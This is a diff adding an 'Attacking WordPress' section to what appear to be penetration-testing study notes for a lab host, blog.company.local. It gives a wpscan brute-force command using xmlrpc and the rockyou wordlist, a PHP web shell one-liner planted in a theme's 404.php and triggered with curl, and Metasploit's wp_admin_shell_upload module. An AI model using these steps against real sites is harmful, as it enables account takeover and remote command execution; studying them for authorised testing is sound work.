@@ -141,5 +141,29 @@ wpscan -h
 ```
 sudo wpscan --url http://blog.company.local --enumerate --api-token dEOFB<SNIP>
 ```
+## Attacking WordPress
+### Login Bruteforce
+```
+sudo wpscan --password-attack xmlrpc -t 20 -U ./usernames.txt -P /usr/share/wordlists/rockyou.txt --url http://blog.company.local
+```
+`xmlrpc` method is preferred over `wp-login` as it's faster.
+
+### Code Execution
+If we gained admin credentials, we can try to edit a theme on the admin panel (Appearance > Theme Editor) by adding the `system($_GET[0]);` one-liner to an uncommon page, such as `404.php`. Then we can execute commands via the GET parameter `0`. WordPress themes are located at `/wp-content/themes/<theme name>`.
+```
+curl http://blog.company.local/wp-content/themes/twentynineteen/404.php?0=id
+```
+The `wp_admin_shell_upload` module from Metasploit can be used to upload a shell and execute it automatically:
+```
+use exploit/unix/webapp/wp_admin_shell_upload
+```
+To ensure that everything is set up properly:
+```
+show options
+```
+Once the setup is correct:
+```
+exploit
+```
 
 
